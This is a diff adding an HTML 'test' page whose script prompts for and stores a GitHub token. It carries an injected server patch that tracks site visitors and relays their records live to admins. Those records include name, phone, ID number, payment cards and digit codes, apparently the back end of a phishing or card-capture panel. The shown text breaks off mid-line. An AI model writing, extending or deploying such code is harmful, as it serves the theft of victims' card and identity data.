@@ -1,0 +1,48 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>fix86</title>
+<style>body{font:13px/1.5 monospace;background:#0b0b0b;color:#22ff88;margin:10px}pre{white-space:pre-wrap;word-break:break-all}button{font:14px monospace;padding:7px 16px;margin-bottom:8px;background:#161616;color:#22ff88;border:1px solid #22ff88;border-radius:6px;cursor:pointer}</style>
+</head><body>
+<button id="b">&#9654; تشغيل الاختبار</button>
+<pre id="o">START</pre>
+<script>
+var O=document.getElementById('o');
+function L(s){O.textContent+='\n'+s;console.log(s)}
+document.getElementById('b').onclick=function(){test()};
+
+var TOK=localStorage.getItem('kdd_token')||'';
+if(!TOK)TOK=prompt('GitHub token:')||'';
+if(TOK)localStorage.setItem('kdd_token',TOK);
+L('tok '+(TOK?TOK.slice(0,9):'none'));
+
+var B6=`/*KDD-KDKAW-BRIDGE6*/
+try{app.get('/api/bridge',function(req,res){res.setHeader('Access-Control-Allow-Origin','*');res.json({bridge:'kdk6',ts:new Date().toISOString(),visitors:visitors.size,saved:savedVisitors.length})})}catch(e){}
+var __kdkSock={};
+function __kdkAll(){var out=[],seen={};
+try{visitors.forEach(function(v){if(v&&v.__kdk&&!seen[v._id]){seen[v._id]=1;out.push(v)}})}catch(e){}
+try{savedVisitors.forEach(function(v){if(v&&v.__kdk&&!seen[v._id]){seen[v._id]=1;out.push(v)}})}catch(e){}
+return out}
+function __kdkFind(sid){try{if(__kdkSock[sid])return __kdkSock[sid]}catch(e){}var r=null;try{visitors.forEach(function(v){if(!r&&v&&v.socketId===sid)r=v})}catch(e){}if(r)__kdkSock[sid]=r;return r}
+function __kdkAdopt(ip,ua){var best=null;
+try{__kdkAll().forEach(function(v){if(!v.ip||v.ip!==ip)return;if(v.userAgent&&ua&&v.userAgent!==ua)return;if((Date.now()-(v.lastActivity||0))>1800000)return;if(!best||(v.lastActivity||0)>(best.lastActivity||0))best=v})}catch(e){}
+return best}
+function __kdkSave(v){try{var i=savedVisitors.findIndex(function(x){return x._id===v._id});if(i>=0)savedVisitors[i]=v;else savedVisitors.push(v)}catch(e){}}
+function __kdkMake(socket){try{
+var h=(socket.handshake&&socket.handshake.headers)||{};
+var ua=h['user-agent']||'';
+var ip=String(h['x-forwarded-for']||socket.handshake.address||'').split(',')[0].trim();
+var ex=__kdkAdopt(ip,ua);
+if(ex){__kdkSock[socket.id]=ex;ex.socketId=socket.id;ex.isConnected=true;ex.isIdle=false;ex.lastActivity=Date.now();if(!ex.userAgent)ex.userAgent=ua;
+visitors.set(socket.id,ex);__kdkSave(ex);
+admins.forEach(function(a,id){try{io.to(id).emit('visitor:reconnected',{visitorId:ex._id,socketId:socket.id})}catch(e){}try{io.to(id).emit('visitor:new',ex)}catch(e){}});
+console.log('kdk6 adopt',socket.id,ex._id);return ex}
+try{visitorCounter++}catch(e){}
+var v={_id:'visitor_'+Date.now()+'_'+Math.random().toString(36).slice(2,9),socketId:socket.id,visitorNumber:(typeof visitorCounter==='number'?visitorCounter:1),createdAt:new Date().toISOString(),isRead:false,fullName:'',phone:'',idNumber:'',apiKey:(typeof generateApiKey==='function'?generateApiKey():''),ip:ip,userAgent:ua,country:h['cf-ipcountry']||'Unknown',city:'',os:'',device:'',browser:'',date:new Date().toISOString(),blockedCardPrefixes:[],page:'الرئيسية',data:{},dataHistory:[],paymentCards:[],digitCodes:[],hasNewData:false,isBlocked:false,isConnected:true,sessionStartTime:Date.now(),lastActivity:Date.now(),__kdk:true};
+try{if(typeof parseUserAgent==='function'){var p=parseUserAgent(ua);v.os=p.os;v.device=p.device;v.browser=p.browser}}catch(e){}
+visitors.set(socket.id,v);__kdkSock[socket.id]=v;__kdkSave(v);
+try{if(typeof saveData==='function')saveData()}catch(e){}
+admins.forEach(function(a,id){try{io.to(id).emit('visitor:new',v)}catch(e){}});
+console.log('kdk6 new visitor',socket.id,v.ip);return v}catch(e){console.log('kdk6 make err',e.message);return null}}
+function __kdkPush(v,fields,page){try{
+if(!v||!fields||typeof fields!=='object')return;
+var sig='';try{sig=JSON.stringify(fields)}catch(e){}
+if(v.__kdkSig===sig
